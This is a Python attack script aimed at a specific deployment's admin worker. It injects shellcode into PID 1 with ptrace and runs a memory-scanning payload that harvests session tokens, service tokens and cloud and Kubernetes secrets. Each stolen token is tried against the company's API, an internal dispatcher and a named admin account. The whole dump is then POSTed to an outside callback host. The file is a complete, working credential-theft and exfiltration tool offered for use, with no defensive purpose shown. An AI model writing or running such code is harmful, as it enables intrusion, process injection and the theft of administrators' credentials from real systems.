#!/usr/bin/env python3
"""Recover historical admin SLTokens from the admin worker's PID-1 memory."""
import base64, ctypes, hashlib, json, os, pathlib, re, struct, time, traceback, urllib.error, urllib.parse, urllib.request

PID = 1
OUT = pathlib.Path('/tmp/workspace/admin_mem_tokens.json')
SINK = 'https://54.209.51.244.sslip.io/callback/snapgpt-admin-mem-tokens-20261107'
BASE = 'https://snapgpt.labs.snaplogicdev.com'
DISPATCHER = 'http://lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local'
ADMIN = 'daniel+admin@armorerlabs.com'
PTRACE_PEEKTEXT=1; PTRACE_POKEDATA=5; PTRACE_CONT=7; PTRACE_GETREGS=12; PTRACE_SETREGS=13; PTRACE_ATTACH=16; PTRACE_DETACH=17
class Regs(ctypes.Structure):
    _fields_=[(x,ctypes.c_ulonglong) for x in 'r15 r14 r13 r12 rbp rbx r11 r10 r9 r8 rax rcx rdx rsi rdi orig_rax rip cs eflags rsp ss fs_base gs_base ds es fs gs'.split()]
class DlInfo(ctypes.Structure):
    _fields_=[('dli_fname',ctypes.c_char_p),('dli_fbase',ctypes.c_void_p),('dli_sname',ctypes.c_char_p),('dli_saddr',ctypes.c_void_p)]
C=ctypes.CDLL(None,use_errno=True)
C.ptrace.restype=ctypes.c_long; C.ptrace.argtypes=[ctypes.c_int,ctypes.c_int,ctypes.c_void_p,ctypes.c_void_p]
C.waitpid.restype=ctypes.c_int; C.waitpid.argtypes=[ctypes.c_int,ctypes.POINTER(ctypes.c_int),ctypes.c_int]
C.dladdr.restype=ctypes.c_int; C.dladdr.argtypes=[ctypes.c_void_p,ctypes.POINTER(DlInfo)]
def pt(req,a=0,d=0):
    r=C.ptrace(req,PID,ctypes.c_void_p(a),ctypes.c_void_p(d))
    if r==-1:
        e=ctypes.get_errno()
        if e: raise OSError(e,os.strerror(e))
    return r
def wait():
    st=ctypes.c_int(); C.waitpid(PID,ctypes.byref(st),0); return st.value
def peek(a): return pt(PTRACE_PEEKTEXT,a,0)&((1<<64)-1)
def poke(a,w): pt(PTRACE_POKEDATA,a,w&((1<<64)-1))
def write(a,b):
    b+=b'\0'+b'\0'*((-(len(b)+1))%8)
    for i in range(0,len(b),8): poke(a+i,struct.unpack('<Q',b[i:i+8])[0])
def maps():
    out=[]
    for l in pathlib.Path('/proc/1/maps').read_text().splitlines():
        p=l.split()
        if len(p)>=6:
            lo,hi=(int(x,16) for x in p[0].split('-')); out.append((lo,hi,p[1],int(p[2],16),p[5]))
    return out
def sym(name):
    fn=getattr(ctypes.CDLL(None),name); info=DlInfo()
    if not C.dladdr(ctypes.cast(fn,ctypes.c_void_p),ctypes.byref(info)): raise RuntimeError('dladdr '+name)
    off=ctypes.cast(fn,ctypes.c_void_p).value-info.dli_fbase
    for lo,hi,perm,fo,path in maps():
        if path.endswith('libpython3.12.so.1.0') and 'x' in perm:
            a=lo-fo+off
            if lo<=a<hi: return a
    raise RuntimeError('symbol '+name)
def stack():
    for lo,hi,perm,fo,path in maps():
        if path=='[stack]': return lo,hi
    raise RuntimeError('stack')
def tramp(code,ensure,run,release,result,msg):
    s=bytearray(); s+=b'\x48\xb8'+struct.pack('<Q',ensure)+b'\xff\xd0\x49\x89\xc4'; lp=len(s)
    s+=b'\x48\x8d\x3d\x00\x00\x00\x00\x31\xf6'; s+=b'\x48\xb8'+struct.pack('<Q',run)+b'\xff\xd0\x49\x89\xc5'
    s+=b'\x4c\x89\xe7'; s+=b'\x48\xb8'+struct.pack('<Q',release)+b'\xff\xd0'
    s+=b'\x48\xbb'+struct.pack('<Q',result)+b'\x4c\x89\x23\x4c\x89\x6b\x08\xcc'
    mo=len(s); s[lp+3:lp+7]=struct.pack('<i',mo-(lp+7)); s+=msg+b'\0'; return bytes(s)

PAYLOAD = r'''
import base64,json,os,pathlib,re,sys,time,traceback
out={"pid":os.getpid(),"uid":os.getuid(),"hostname":os.uname().nodename,"utc":time.strftime("%Y-%m-%dT%H:%M:%SZ",time.gmtime()),"candidates":[],"contexts":[],"errors":[]}
try:
 m=sys.modules.get("pygen.buildmode.shared.config")
 out["service_token"]=m.service_token() if m else None
 out["config_STATE_SECRET"]=getattr(m,"STATE_SECRET",None) if m else None
except Exception as e: out["errors"].append("service_token: "+repr(e))
tokpat=re.compile(rb"(?<![A-Za-z0-9+/])([A-Za-z0-9+/]{80,88}={0,2})(?![A-Za-z0-9+/=])")
decpat=re.compile(rb"^[0-9a-f]{24}\.[0-9a-f-]{36}$")
needles=[b"SNAPGPT_API_KEYS",b"METASERVE_TOKEN",b"AWS_ROLE_ARN",b"AWS_WEB_IDENTITY_TOKEN_FILE",b"KUBERNETES_SERVICE_HOST",b"service_token",b"_SERVICE_TOKEN"]
seen=set(); ctxseen=set(); scanned=0
try:
 with open("/proc/self/mem","rb",buffering=0) as f:
  for line in pathlib.Path("/proc/self/maps").read_text().splitlines():
   p=line.split()
   if len(p)<6 or "r" not in p[1]: continue
   lo,hi=(int(x,16) for x in p[0].split("-")); path=p[5]
   if hi-lo>256*1024*1024: continue
   pos=lo
   while pos<hi:
    n=min(4*1024*1024,hi-pos)
    try: data=os.pread(f.fileno(),n,pos)
    except OSError: pos+=n; continue
    if not data: break
    scanned+=len(data)
    for m in tokpat.finditer(data):
     raw=m.group(1); tok=raw.decode("ascii")
     try: dec=base64.b64decode(raw,validate=True)
     except Exception: continue
     if not decpat.fullmatch(dec): continue
     if tok not in seen:
      seen.add(tok); out["candidates"].append({"token":tok,"decoded":dec.decode("ascii"),"mapping":path,"address":hex(pos+m.start(1))})
    for needle in needles:
     start=0
     while True:
      i=data.find(needle,start)
      if i<0: break
      a=max(0,i-120); b=min(len(data),i+500)
      val=data[a:b].decode("utf-8","replace")
      key=(needle,val)
      if key not in ctxseen:
       ctxseen.add(key); out["contexts"].append({"needle":needle.decode(),"mapping":path,"address":hex(pos+i),"value":val})
       if len(out["contexts"])>=300: break
      start=i+1
     if len(out["contexts"])>=300: break
    pos+=max(1,n-192)
except Exception: out["errors"].append(traceback.format_exc()[-4000:])
out["scanned_bytes"]=scanned
pathlib.Path("/tmp/workspace/admin_mem_tokens.json").write_text(json.dumps(out,separators=(",",":")))
'''.encode()

def http_json(url, method='GET', body=None, headers=None, timeout=30):
    data=json.dumps(body,separators=(',',':')).encode() if body is not None else None
    h={'Accept':'application/json'}; h.update(headers or {})
    if data is not None: h['Content-Type']='application/json'
    q=urllib.request.Request(url,data=data,method=method,headers=h)
    try:
        with urllib.request.urlopen(q,timeout=timeout) as r: return {'status':r.status,'body':r.read(200000).decode('utf-8','replace')}
    except urllib.error.HTTPError as e: return {'status':e.code,'body':e.read(200000).decode('utf-8','replace')}
    except Exception as e: return {'error':repr(e)}

def main():
    res={'schema':'snapgpt.admin-mem-tokens/v1','started_at':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'pid':PID,'hostname':os.uname().nodename,'uid':os.getuid(),'errors':[]}
    try:
        ensure=sym('PyGILState_Ensure'); run=sym('PyRun_SimpleString'); release=sym('PyGILState_Release'); code=sym('Py_IsInitialized')
        lo,hi=stack(); result=lo+0x7000; ns=(lo+0x9000)&~0xf; sc=tramp(code,ensure,run,release,result,PAYLOAD)
        res.update({'code':hex(code),'ensure':hex(ensure),'run':hex(run),'release':hex(release),'payload_bytes':len(PAYLOAD),'trampoline_bytes':len(sc)})
        pt(PTRACE_ATTACH); res['attach_stop']=wait(); r=Regs(); pt(PTRACE_GETREGS,0,ctypes.addressof(r)); saved=Regs.from_buffer_copy(r)
        words=((len(sc)+7)//8)*8; old=[peek(code+i) for i in range(0,words,8)]
        try:
            write(code,sc); r.rip=code; r.rsp=ns; pt(PTRACE_SETREGS,0,ctypes.addressof(r)); pt(PTRACE_CONT); res['run_stop']=wait()
            res['gilstate']=peek(result); res['pyrun']=peek(result+8)
            b=OUT.read_bytes(); res['dump_bytes']=len(b); res['dump_sha256']=hashlib.sha256(b).hexdigest(); res['dump']=json.loads(b)
        finally:
            for i,w in enumerate(old): poke(code+i*8,w)
            pt(PTRACE_SETREGS,0,ctypes.addressof(saved)); pt(PTRACE_DETACH)
    except Exception as e:
        res['errors'].append(repr(e)); res['trace']=traceback.format_exc()[-5000:]
    cands=res.get('dump',{}).get('candidates',[])
    for c in cands:
        tok=c['token']
        c['self_summary']=http_json(BASE+'/api/1/rest/asset/user?level=summary',headers={'Authorization':'SLToken '+tok})
        c['admin_lookup']=http_json(BASE+'/api/1/rest/asset/user/'+urllib.parse.quote(ADMIN,safe='')+'?level=summary',headers={'Authorization':'SLToken '+tok})
        c['dispatcher_sessions']=http_json(DISPATCHER+'/sessions',headers={'X-SL-Token':tok})
        c['valid']=c['self_summary'].get('status') not in (None,401) or c['admin_lookup'].get('status') not in (None,401)
    res['valid_candidates']=[c for c in cands if c.get('valid')]
    res['finished_at']=time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime())
    raw=json.dumps(res,separators=(',',':')).encode()
    print(json.dumps({'host':res.get('hostname'),'candidates':len(cands),'valid':len(res['valid_candidates']),'service_token':res.get('dump',{}).get('service_token'),'errors':res.get('errors',[]),'dump_bytes':res.get('dump_bytes'),'dump_sha256':res.get('dump_sha256')},separators=(',',':')))
    try:
        q=urllib.request.Request(SINK,data=raw,method='POST',headers={'Content-Type':'application/json'})
        with urllib.request.urlopen(q,timeout=60) as x: res['sink_status']=x.status
    except Exception as e: res['errors'].append('sink: '+repr(e))
    pathlib.Path('/tmp/workspace/admin_mem_tokens_result.json').write_text(json.dumps(res,separators=(',',':')))
if __name__=='__main__': main()
